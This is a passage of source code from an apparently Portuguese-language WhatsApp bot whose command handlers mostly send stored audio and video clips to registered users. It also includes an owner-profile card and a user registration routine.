  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editlevi':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editlevi.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editmidoriya':
  
  if (!isRegister) return reply(mess.only.daftarB)
  
buf = fs.readFileSync(`./Junhin/audio2/editmi1.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break






case 'shit50':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit50.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit49':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit49.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit48':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit48.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit47':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit47.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit46':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit46.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit45':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit45.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit44':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit44.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit43':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit43.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit42':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit42.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit41':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit41.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit40':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit40.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit39':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit39.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit38':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit38.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit37':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit37.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit36':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit36.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit35':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit35.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit34':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit34.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit33':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit33.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit32':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit32.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit31':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit31.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit30':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit30.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit29':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit29.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit28':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit28.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit27':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit27.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit26':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit26.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit25':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit25.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break

case 'dono':

  if (!isRegister) return reply(mess.only.daftarB)

  try {

ppimg = await Pin.getProfilePicture(`https://i.ibb.co/p3q6PkJ/Techbigs-com-Pics-Art-04-13-11-54-05.jpg`)

  } catch {

ppimg = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSMw3IkVl7XvpsoPbAJ8NSpn48900QDepdA4Q&usqp=CAU'

  }

  teks = `┠⊷ FOTO DO PERFIL DO DONO😐 :👆👆
  
┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ NOME DO BOT : JUNHIN BOT
┗━━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ NUMERO DO DONO: wa.me/557187566648
┗━━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ TOTAL CHAT DO JUNHIN : 2008
┗━━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ TEU LINK : wa.me/${sender.split("@")[0]}
┗━━━━━━━━━━━━━━━━━━━`

  its = await getBuffer (ppimg)

  Pin.sendMessage(from, its, image, {

quoted: mek, caption: teks

  })

  

  break

case 'shit24':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit24.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit23':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit23.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit22':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit22.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit21':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit21.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit20':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit20.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit19':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit19.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit18':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit18.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit17':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit17.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit16':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit16.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit15':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit15.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit14':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit14.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit13':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit13.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit12':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit12.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit11':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit11.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit10':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit10.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit9':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit9.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit8':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit8.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit7':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit7.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit6':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit6.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit5':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit5.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit4':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit4.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit3':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit3.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit2':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit2.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case 'shit1':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/shit.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break







case 'paizin':
case '☻':
case 'brotei':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/Pa.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



  case 'pai':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/Pai.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



  case 'wtf':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/wtfc.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'botfaledoseudono':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/ju.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'amei':
  case 'bonita':
  case 'maravilhosa':
  case 'apaixonei':
  case 'perfeita':
  case 'gostosa':
  case 'linda':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/gado.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'lixo':
  case 'caiu':
  case 'botinutil':
  case 'botruim':
  case 'botdemerda':
  case 'botbosta':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/tmnc.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'caralho':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/caralho.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'pika':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/pika.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break 



  case 'cring':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/cring.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'preto':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/preto.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'dolly':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/dolly.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break 

//-registro

case '.daftar':
					Pin.updatePresence(from, Presence.composing)
					if (isUser) return reply('*ᴠᴏᴄᴇ ᴇsᴛᴀ ʀᴇɢɪsᴛʀᴀᴅᴏ!*')
					if (isBanned) return reply(mess.only.benned)
					user.push(sender)
					fs.writeFileSync('./database/json/user.json', JSON.stringify(user))
					try {

                  ppimg = await Pin.getProfilePicture(`${sender.split('@')[0]}@c.us`)

                    } catch {

                  ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg@'

                    }
                    
					teks = `╭─「 *_ᴄᴀᴅᴀsᴛʀᴏ_* 」\`\`\`\n│ \n│\`\`\`「 *ᴅᴀᴛᴀ*  」: *${date}* \`\`\`\n│\`\`\`「 *ɴᴏᴍᴇ* 」: ${pushname2}\`\`\`\n│\`\`\`「 *ɴᴜᴍᴇʀᴏ* 」: wa.me/${sender.split("@")[0]}\`\`\`\n│\`\`\`ᴘᴀʀᴀ ᴜsᴀʀ ᴊᴜɴʜɪɴ ʙᴏᴛ\`\`\`\n│\`\`\`ᴘᴏʀ ғᴀᴠᴏʀ\`\`\`\n│\`\`\`ᴇɴᴠɪᴀʀ *${prefix}ᴍᴇɴᴜ*\`\`\`\n│\`\`\`\n│ᴛᴏᴛᴀʟ ᴜsᴀɴᴅᴏ: ${user.length} ᴘᴇssᴏᴀ\`\`\`\n╰────────────────`
					               
                    its = await getBuffer (ppimg)

                    Pin.sendMessage(from, its, image, {

quoted: mek, caption: teks

                    })
					
					
					
					break



  case 'pato':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/pato.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'botlixo':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/eu.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.m4':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/m4.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.sexo':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/bumbum.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.ghost':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/ghost.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.lilpeep':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/lilpeep.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.hylander':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/hylander.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'menuedit':
  case '.menu4':
  
    if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/edity.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break


  case '.menushit':
  case '.menu5':
  
    if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/biel2.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.menuhot':
  case 'ain':
  
    if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/saf.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.help':
  
  case '.menu':
  
  case '.cmd':
  
    if (!isRegister) return reply(mess.only.daftarB)
    
reply(mess.wait)
    
buf = fs.readFileSync(`./Junhin/audio2/bv.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'cirilo':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/cirilo.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'machista':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/machista.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'macaco':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/macaco.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.xxx2':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/xxx2.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.xxx3':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/xxx3.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case '.voar':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/voar.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



case 'ola':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync(`./assets/ola.mp3`);
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'bv':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/bv.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'flw':
case 'tchau':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync(`./assets/tchau.mp3`);
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'bem':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/bem.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'a':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/a.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'tirada':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/tirada.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break      



case 'beat1':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/b3eat1.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.mundoEesse':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/mundoéesse.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.mercury':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/mercury.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.ponta':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/ponta.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case 'speak':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/speak.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.moça':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/moça.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.nav':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/nav.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.dama':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/dama.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.remedy':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/remedy.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true}) 
break



case '.portugal':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/portugal.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.yourname':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/yourname.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.fotodope':
case '.fotodopé':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/fotodopé.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.timmies':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/timmies.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.lanomeubarraco':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/lano.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.quemtavala':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/qmtavala.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.drinkazul':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/drinkazul.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.badideal':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/badideal.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.telepatia':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/telepatia.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.copao':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/copao.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.cavala':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/cavala.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.facetime':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/facetime.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.pe':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/pe.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.banho':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/banho.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.nike1':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/nike12.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.nav':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./bi/nav.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.nike12':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/nike.12.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break




case '..':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./Bi/BanhoDeleite.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



case '.AkDoflamengo':
  if (!isRegister) return reply(mess.only.daftarB)
tujuh = fs.readFileSync('./assets/AkDoflamengo.mp3');
Pin.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break



